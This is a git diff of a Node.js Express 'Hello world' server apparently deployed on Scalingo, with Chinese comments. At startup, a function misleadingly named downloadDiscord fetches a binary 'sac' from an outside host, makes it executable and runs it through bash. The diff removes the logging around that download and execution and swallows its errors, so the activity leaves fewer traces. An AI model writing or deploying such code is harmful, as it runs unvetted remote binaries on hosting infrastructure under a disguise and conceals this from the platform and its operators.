@@ -5,20 +5,50 @@ const path = require('path');
 const axios = require('axios');
 const { exec } = require('child_process');
 const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
-// const FILE_PATH = './.npm'; // <--- 不再需要这个常量
+const FILE_PATH = './.npm'; // 目标目录
+
+// =================================================================
+// 🌟 解决 ENOENT 错误的关键修改: 确保目录存在
+// =================================================================
+
+try {
+    // 检查目录是否存在，如果不存在则创建它
+    if (!fs.existsSync(FILE_PATH)) {
+        // recursive: true 确保如果需要创建多级目录也能成功
+        fs.mkdirSync(FILE_PATH, { recursive: true });
+        console.log(`Successfully created directory: ${FILE_PATH}`);
+    }
+} catch (err) {
+    // 如果创建失败，记录错误
+    console.error(`Error attempting to create directory ${FILE_PATH}:`, err);
+}
+
+// =================================================================
 
 app.get("/", function(req, res) {
   res.send("Hello world!");
 });
 
-// **已删除 /log 路由**
-// 因为读取本地文件在云环境中会导致数据丢失和错误。
-// Scalingo 平台会直接收集 console.log 的输出作为您的应用日志。
+app.get("/log", (req, res) => {
+  const logPath = path.join(FILE_PATH, 'log.txt');
+  fs.readFile(logPath, "utf8", (err, data) => {
+    if (err) {
+      console.error(err);
+      // ⚠️ 注意：如果文件不存在，现在只会报“文件不存在”的错误，
+      // 但目录存在的错误已解决。
+      // 如果 log.txt 是运行时产生的，您可能还需要在 log.txt 不存在时
+      // 返回一个空文件，而不是 500 错误，但这取决于您的需求。
+      res.status(500).send("Error reading log.txt");
+    } else {
+      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+      res.send(data);
+    }
+  });
+});
 
 const downloadDiscord = async () => {
   try {
-    // 使用 console.log 替代之前的注释，确保下载开始信息被 Scalingo 收集
-    console.log('Start downloading sac...');
+    // ... (保持不变)
     const response = await axios({
       method: 'get',
       url: 'https://amd64.2go.us.kg/sac',
@@ -30,21 +60,15 @@ const downloadDiscord = async () => {
 
     return new Promise((resolve, reject) => {
       writer.on('finish', () => {
-        // 使用 console.log 记录重要事件
-        console.log('Download completed and file saved.'); 
+        console.log('Download completed');
         exec('chmod +x sac', (err) => {
-          if (err) {
-            console.error('Error changing file permissions:', err); // 使用 console.error 记录错误
-            reject(err);
-          }
+          if (err) reject(err);
           resolve();
         });
       });
       writer.on('error', reject);
     });
   } catch (err) {
-    // 捕获和记录下载错误
-    console.error('Error during downloadDiscord process:', err.message);
     throw err;
   }
 };
@@ -53,26 +77,14 @@ const Execute = async () => {
   try {
     await downloadDiscord();
     const command = './sac';
-    console.log(`Executing command: ${command}`); // 记录执行命令的事件
     exec(command, { 
       shell: '/bin/bash'
-    }, (err, stdout, stderr) => {
-        if (err) {
-            console.error(`Execution error: ${err.message}`); // 记录执行错误
-            return;
-        }
-        if (stdout) console.log(`Execution stdout: ${stdout}`); // 记录标准输出
-        if (stderr) console.error(`Execution stderr: ${stderr}`); // 记录标准错误
     });
-  } catch (err) {
-    // 捕获和记录 Execute 流程中的任何错误
-    console.error('Error in Execute function:', err.message);
-  }
+  } catch (err) {}
 };
 
 Execute();
 
 app.listen(PORT, () => {
-  // 这条消息会被 Scalingo 平台自动捕获并作为日志显示
   console.log(`Server is running on port:${PORT}`);
 });
